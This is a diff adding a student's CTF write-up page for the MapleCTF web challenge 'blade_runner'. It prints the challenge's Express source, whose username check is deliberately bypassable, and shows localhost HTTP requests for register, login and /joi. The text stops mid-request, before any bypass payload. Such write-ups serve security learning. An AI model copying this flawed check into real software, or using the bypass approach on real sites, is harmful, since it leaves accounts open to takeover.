@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="MapleCTF
+You look lonely. I can fix that.
+Attachment: blade_runner.zip
+I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.
+This is what the page looks like when visiting the landing page:
+After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://morebaconstrips.github.io/writeups/web/blade_runner/" />
+
+
+    <title>
+        
+            blade_runner :: Gabriele Abbate  — Cybersecurity MSc student
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="custom.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="blade_runner">
+<meta itemprop="description" content="MapleCTF
+You look lonely. I can fix that.
+Attachment: blade_runner.zip
+I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.
+This is what the page looks like when visiting the landing page:
+After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page."><meta itemprop="datePublished" content="2023-10-01T18:48:00+02:00" />
+<meta itemprop="dateModified" content="2023-10-01T18:48:00+02:00" />
+<meta itemprop="wordCount" content="869"><meta itemprop="image" content="https://morebaconstrips.github.io/"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://morebaconstrips.github.io/"/>
+
+<meta name="twitter:title" content="blade_runner"/>
+<meta name="twitter:description" content="MapleCTF
+You look lonely. I can fix that.
+Attachment: blade_runner.zip
+I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.
+This is what the page looks like when visiting the landing page:
+After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page."/>
+
+
+
+    <meta property="og:title" content="blade_runner" />
+<meta property="og:description" content="MapleCTF
+You look lonely. I can fix that.
+Attachment: blade_runner.zip
+I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.
+This is what the page looks like when visiting the landing page:
+After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://morebaconstrips.github.io/writeups/web/blade_runner/" /><meta property="og:image" content="https://morebaconstrips.github.io/"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2023-10-01T18:48:00+02:00" />
+<meta property="article:modified_time" content="2023-10-01T18:48:00+02:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-10-01 18:48:00 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                gabriele.portfolio.sh</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">~/about</a></li><li><a href="/projects">~/projects</a></li><li><a href="/writeups">~/writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://morebaconstrips.github.io/writeups/web/blade_runner/">blade_runner</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>MapleCTF</p>
+<blockquote>
+<p>You look lonely. I can fix that.</p>
+</blockquote>
+<p>Attachment: blade_runner.zip</p>
+<p>I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page.</p>
+<p>This is what the page looks like when visiting the landing page:</p>
+<p><img src="/images/br1.png" alt="Screenshot from 2023-10-02 22-18-27.png"></p>
+<p>After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page.</p>
+<p>However, something wasn&rsquo;t working right from the beginning when I tried registering with a random username and password. After submitting the registration form, the backend redirected the data I had inserted to the login page without any response.</p>
+<p><img src="/images/br2.png" alt="Screenshot from 2023-10-02 22-23-46.png"></p>
+<p><img src="/images/br3.png" alt="Screenshot from 2023-10-02 22-24-03.png"></p>
+<p>Let&rsquo;s intercept some requests with Burp Suite and see if something strange is happening.</p>
+<p><img src="/images/br4.png" alt="Screenshot from 2023-10-02 22-27-47.png"></p>
+<p>Wait&hellip; A GET request? Let&rsquo;s also take a look at the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">//user_route.js
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;path&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">util</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../util&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;../public/register.html&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">k</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">k</span>].<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;You can&#39;t use that username.&#34;</span>);
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">toLowerCase</span>()] <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">k</span>];
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">obj</span>[<span style="color:#e6db74">&#34;password&#34;</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">obj</span>[<span style="color:#e6db74">&#34;username&#34;</span>]) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Invalid body.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">obj</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">username</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">insert_response</span>(<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">password</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/user/login&#39;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;An error occurred with processing!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;../public/login.html&#39;</span>));
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">real_password</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">read_response</span>(<span style="color:#a6e22e">username</span>);
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">real_password</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">real_password</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">password</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;invalid credentials&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">username</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/joi&#39;</span>);
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;An error occurred with processing!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">//auth.js
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">admin</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>  (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;HERE&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;ADMIN REQUIRED.&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{ 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;LOGIN REQUIRED&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">admin</span>;
+</span></span></code></pre></div><p>It seems like we need to make some changes to the request. First, we need to send a POST request. Additionally, since it appears that the API reads the content of the JSON after validating that the username is not &ldquo;admin,&rdquo; we want to send an actual JSON file in the request body. I&rsquo;m going to check how the server behaves by forwarding the requests to Burp Repeater.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /user/register HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:6969
+</span></span><span style="display:flex;"><span>sec-ch-ua: <span style="color:#e6db74">&#34;Chromium&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;117&#34;</span>, <span style="color:#e6db74">&#34;Not;A=Brand&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile: ?0
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform: <span style="color:#e6db74">&#34;Linux&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/117.0.5938.132 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: navigate
+</span></span><span style="display:flex;"><span>Sec-Fetch-User: ?1
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: document
+</span></span><span style="display:flex;"><span>Referer: http://localhost:6969/user/register
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language: en-GB,en-US;q<span style="color:#f92672">=</span>0.9,en;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Cookie: connect.sid<span style="color:#f92672">=</span>s%3A7mHg1cteHIWFFsEreZY_hfN-PSDDLd08.v7JH4oK2LzFtdOXau%2FONS14Gf9QpTDoW%2BhE9guiQEg4
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;pass&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>Location: /user/login
+</span></span><span style="display:flex;"><span>Vary: Accept
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">66</span>
+</span></span><span style="display:flex;"><span>Set-Cookie: connect.sid<span style="color:#f92672">=</span>s%3AXaWVvwLH_tAQcIz_ssHDCsJu855oJs8D.kWcBqgLSF4y49Kuc7QxChohvX8YSH41wMX9whxwyxas; Path<span style="color:#f92672">=</span>/; HttpOnly
+</span></span><span style="display:flex;"><span>Date: Mon, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2023</span> 20:38:20 GMT
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;Found. Redirecting to &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/user/login&#34;</span>&gt;/user/login&lt;/a&gt;&lt;/p&gt;
+</span></span></code></pre></div><p>Nice, now we have a valid response. Let&rsquo;s send the same credentials to the login API to see what we get.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /user/login HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:6969
+</span></span><span style="display:flex;"><span>sec-ch-ua: <span style="color:#e6db74">&#34;Chromium&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;117&#34;</span>, <span style="color:#e6db74">&#34;Not;A=Brand&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile: ?0
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform: <span style="color:#e6db74">&#34;Linux&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/117.0.5938.132 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: navigate
+</span></span><span style="display:flex;"><span>Sec-Fetch-User: ?1
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: document
+</span></span><span style="display:flex;"><span>Referer: http://localhost:6969/user/register
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language: en-GB,en-US;q<span style="color:#f92672">=</span>0.9,en;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Cookie: connect.sid<span style="color:#f92672">=</span>s%3A7mHg1cteHIWFFsEreZY_hfN-PSDDLd08.v7JH4oK2LzFtdOXau%2FONS14Gf9QpTDoW%2BhE9guiQEg4
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;pass&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>Location: /joi
+</span></span><span style="display:flex;"><span>Vary: Accept
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">52</span>
+</span></span><span style="display:flex;"><span>Set-Cookie: connect.sid<span style="color:#f92672">=</span>s%3AWFQJdRxXelVCzahtrAhDifVGIYVgvVP1.aaulqcrNjqSv94SMpc0O%2FXqVFoUtaZiXdQ65YUPx7xI; Path<span style="color:#f92672">=</span>/; HttpOnly
+</span></span><span style="display:flex;"><span>Date: Mon, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2023</span> 20:43:46 GMT
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;Found. Redirecting to &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/joi&#34;</span>&gt;/joi&lt;/a&gt;&lt;/p&gt;
+</span></span></code></pre></div><p>So far, so good. Now, let&rsquo;s retrieve the content of the final resource.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /joi HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:6969
+</span></span><span style="display:flex;"><span>sec-ch-ua: <span style="color:#e6db74">&#34;Chromium&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;117&#34;</span>, <span style="color:#e6db74">&#34;Not;A=Brand&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile: ?0
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform: <span style="color:#e6db74">&#34;Linux&#34;</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/117.0.5938.132 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: navigate
+</span></span><span style="display:flex;"><span>Sec-Fetch-User: ?1
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: document
+</span></span><span style="display:flex;"><span>Referer: http://localhost:6969/user/register
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language: en-GB,en-US;q<span style="color:#f92672">=</span>0.9,en;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Cookie: connect.sid<span style="color:#f92672">=</span>s%3AO5hKpRxBTPVjNNr8JBI78TU0tJlpPmIa.B%2B88tT9bznweYEU7rTL51Xcsti8tokyZ37KnP0tw0qI
+</span></span><span style="display:flex;"><span>If-None-Match: W/<span style="color:#e6db74">&#34;1d5-18ae340bba8&#34;</span>
+</span></span><span style="display:flex;"><span>If-Modified-Since: Fri, <span style="color:#ae81ff">29</span> Sep <span style="color:#ae81ff">2023</span> 23:23:05 GMT
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
